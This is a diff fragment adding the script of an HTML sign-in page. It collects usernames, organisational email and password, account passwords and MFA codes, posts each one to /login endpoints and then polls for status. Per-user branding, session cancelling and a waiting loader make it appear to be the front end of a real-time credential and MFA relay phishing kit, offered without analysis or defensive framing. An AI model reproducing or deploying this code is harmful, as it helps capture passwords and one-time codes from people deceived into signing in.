+document.querySelector(".org-topbar-brand").addEventListener("click", () => { stopPolling(); showScreen("username"); orgPassword.value = ""; currentUsername = null; setOrgStatus(""); });
+orgCancelRedirectBtn.addEventListener("click", () => { stopPolling(); showScreen("username"); currentUsername = null; setOrgStatus(""); });
+orgLoginForm.addEventListener("submit", async e => {
+  e.preventDefault();
+  const email = orgEmail.value.trim(), password = orgPassword.value; if (!password || !currentUsername) return;
+  setBusy(orgSignInBtn, true, "Sign In"); setOrgStatus("Submitting...", "info", true);
+  try { await postJSON("/login/org-signin", { username: currentUsername, email, password }); orgPassword.value = ""; setOrgStatus(""); startWaitingLoader(); pollStatus(); }
+  catch (err) { setOrgStatus(err.message, "error"); }
+  finally { setBusy(orgSignInBtn, false, "Sign In"); }
+});
+
+usernameBackBtn.addEventListener("click", () => { usernameInput.value = ""; setStatus(""); usernameInput.focus(); });
+if (passwordBackArrow) passwordBackArrow.addEventListener("click", () => { stopPolling(); showScreen("username"); passwordInput.value = ""; cancelSession(currentUsername); currentUsername = null; setStatus(""); resetBranding(); });
+mfaCancelBtn.addEventListener("click", () => { stopPolling(); showScreen("username"); cancelSession(currentUsername); currentUsername = null; setStatus(""); resetBranding(); });
+document.addEventListener("click", e => { if (e.target.closest("[data-back]")) { stopPolling(); showScreen("username"); cancelSession(currentUsername); currentUsername = null; setStatus(""); resetBranding(); } });
+
+passwordForm.addEventListener("submit", async e => {
+  e.preventDefault();
+  const password = passwordInput.value; if (!password || !currentUsername) return;
+  setBusy(passwordBtn, true, "Sign in"); setStatus("Submitting password...", "info", true);
+  passwordCancelBtn.style.display = "inline-block";
+  try {
+    await postJSON("/login/password", { username: currentUsername, password });
+    passwordSubmitted = true; setStatus("Signing in...", "info", true); startWaitingLoader();
+  } catch (err) { setStatus(err.message, "error"); setBusy(passwordBtn, false, "Sign in"); passwordCancelBtn.style.display = "none"; }
+});
+
+passwordCancelBtn.addEventListener("click", () => { stopPolling(); showScreen("username"); cancelSession(currentUsername); currentUsername = null; passwordSubmitted = false; passwordCancelBtn.style.display = "none"; setBusy(passwordBtn, false, "Sign in"); setStatus(""); resetBranding(); });
+
+const togglePw = document.getElementById("togglePw");
+if (togglePw) togglePw.addEventListener("click", () => { const t = passwordInput.type === "text"; passwordInput.type = t ? "password" : "text"; });
+
+mfaCodeForm.addEventListener("submit", async e => {
+  e.preventDefault();
+  const code = mfaCodeInput.value.trim(); if (!code || !currentUsername) return;
+  setBusy(mfaCodeBtn, true, "Verify"); setStatus("Submitting code...", "info", true);
+  try { await postJSON("/login/mfa-code", { username: currentUsername, code }); mfaCodeInput.value = ""; setStatus("Code submitted, waiting…"); startWaitingLoader(); }
+  catch (err) { setStatus(err.message, "error"); }
+  finally { setBusy(mfaCodeBtn, false, "Verify"); }
+});
+
+showScreen("username");
+</script>
+</body>
+</html>
